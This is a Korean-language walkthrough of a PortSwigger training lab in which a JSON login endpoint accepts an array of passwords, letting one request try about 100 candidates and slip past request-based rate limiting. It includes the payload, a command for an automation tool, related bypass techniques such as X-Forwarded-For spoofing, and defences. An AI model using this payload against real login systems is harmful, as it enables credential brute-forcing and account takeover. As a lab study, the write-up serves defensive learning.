# Lab: Broken brute-force protection, multiple credentials per request

## 개요

- **난이도**: Practitioner
- **주제**: Authentication — 취약한 Brute-force 보호 / 한 요청에 다중 자격증명(JSON 배열) / 시도 제한 우회
- **링크**: https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request

## 목표

로그인 요청이 JSON을 받고 `password` 값에 배열을 허용하는 결함을 이용해, 후보 비밀번호 전체를 한 번에 대입해 `carlos` 계정에 접근한다.

- 피해자: `carlos`
- 입력 목록: candidate passwords

## 취약 지점

### 로그인 요청이 JSON + `password` 배열 허용

```http
POST /login HTTP/1.1
Content-Type: application/json

{"username":"carlos","password":"123456"}
```

`password` 값을 **문자열 배열**로 바꿔도 서버가 그대로 처리한다.

```json
{"username":"carlos","password":["123456","password","qwerty", "..."]}
```

```
[서버 동작 (추정)]
  for pw in passwords:        # 배열 전체를 순회
      if verify(username, pw):
          로그인 성공
```

### 시도 제한이 "계정 수"가 아니라 "요청 수" 기준

```
- brute-force 보호는 보통 "요청 횟수" 를 센다
- 한 요청에 100개 비밀번호를 담으면 1회로 카운트됨
→ 시도 제한을 우회하고, 단일 요청으로 brute-force 완료
```

## 공격 단계

### 1단계 — JSON 로그인 확인

로그인 페이지에서 요청을 캡처하면 자격증명이 JSON 으로 전송됨을 확인한다.

```http
POST /login HTTP/1.1
Content-Type: application/json

{"username":"carlos","password":"123456"}
```

### 2단계 — password 를 배열로 교체

candidate passwords 전체를 배열로 넣어 전송한다.

```json
{"username":"carlos","password":["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]}
```

응답이 **302** 면 로그인 성공이다.

### 3단계 — 응답을 브라우저에서 로드

Burp 의 **Show response in browser** 로 302 응답 URL 을 열면 `carlos` 로 로그인된 세션을 얻는다.

### 4단계 — 계정 접근

`My account` 로 이동 → 랩 해결.

## 자동화 툴

```bash
python3 tools/14-authentication-multiple-credentials.py \
  --target "https://LAB-ID.web-security-academy.net" \
  --victim carlos --verify
```

```
동작:
  1) 후보 전체를 JSON 배열로 한 요청에 담아 전송 → 302 확인
  2) --find-exact: 성공한 배열을 이진 탐색(O(log n))해
     정확한 비밀번호 특정
  3) --verify: 인증 세션으로 /my-account 접근 및 사용자 확인
```

주요 옵션:

```
--victim carlos
--username-field/--password-field   JSON 키 이름
--find-exact / --no-find-exact      정확한 비밀번호 특정 여부
--verify                            계정 페이지 확인
```

검증 메모(목 서버):

```
1단계 전체 배열 → 302 성공
2단계 이진 탐색 → 정확한 비밀번호: <pw>
3단계 → [✓] carlos 계정 로그인 확인
```

## Authentication 시리즈 — 시도 제한 우회 변형

| # | 랩 | 우회 방식 |
|---|-----|-----------|
| 005 | response timing | `X-Forwarded-For` 로 IP 차단 우회 |
| 006 | IP block | 성공 로그인으로 실패 카운터 리셋 |
| 007 | account lock | 잠금 메시지로 username 열거 |
| 012 | password change | hidden username + 메시지 차이 |
| 013 | multiple credentials | 한 요청에 다중 자격증명(배열) |

```
공통 패턴:
  보호 기법이 "요청/세션/카운터" 등 검증되지 않은 가정에 의존
  → 한 요청에 여러 자격증명, 헤더로 IP 위조, 성공으로 카운터 리셋 등으로 우회
```

## 방어

```
[근본 원인]
  1) password 필드가 문자열 배열 등 예상치 못한 타입을 허용
  2) 시도 제한이 "요청 수" 기준이라 다중 자격증명에 취약

[올바른 방어]
  1. 입력 타입/스키마 엄격 검증
     - password 는 단일 문자열이어야 함 (배열/객체 거부)
     - JSON 스키마 기반 검증, 예상 외 타입은 400
  2. 시도 제한을 "인증 시도 횟수" 기준으로 집계
     - 한 요청에 여러 자격증명이 와도 각각 카운트 (또는 요청 자체를 거부)
     - 계정 단위 + IP 단위 조합, 시간 창 기반
  3. 인증 실패 응답 통일 + 지수 백오프/잠금/CAPTCHA/MFA
  4. 로그인 실패 패턴 모니터링
  5. 강한 비밀번호 정책 + 유출 비밀번호 차단

[주의]
  "파라미터가 하나일 것" 이라는 암묵적 가정이 타입 혼동(type confusion)으로
  보호 로직을 통째로 우회시킬 수 있다.
```

## 핵심 정리

- `POST /login` 이 JSON 을 받아 `password` 에 배열을 허용해, 후보 전체를 한 요청으로 대입할 수 있었다.
- 시도 제한이 요청 수 기준이어서 배열 전송은 1회로 집계되어 무력화됐고, 302 응답으로 로그인됐다.
- 302 응답을 브라우저에서 로드해 carlos 세션을 얻고 계정 페이지에 접근했다.
- 방어는 입력 타입을 엄격히 검증하고, 시도 제한을 자격증명 단위로 집계하는 것이다.

## 배운 점

- 보호 로직은 "정상 입력의 형태" 를 가정한다. 타입/구조 변형(배열, 중첩 객체)이 그 가정을 깨뜨린다.
- brute-force 방어는 "요청 수" 가 아니라 "실제 자격증명 시도 수" 를 기준으로 해야 한다.
- 006(IP 차단), 007(계정 잠금) 등과 함께 "시도 제한 우회" 계열의 또 다른 변형이다.
- 이 랩을 위해 `tools/14-authentication-multiple-credentials.py` 를 작성하고, 이진 탐색으로 정확한 비밀번호까지 특정하도록 구현했다.
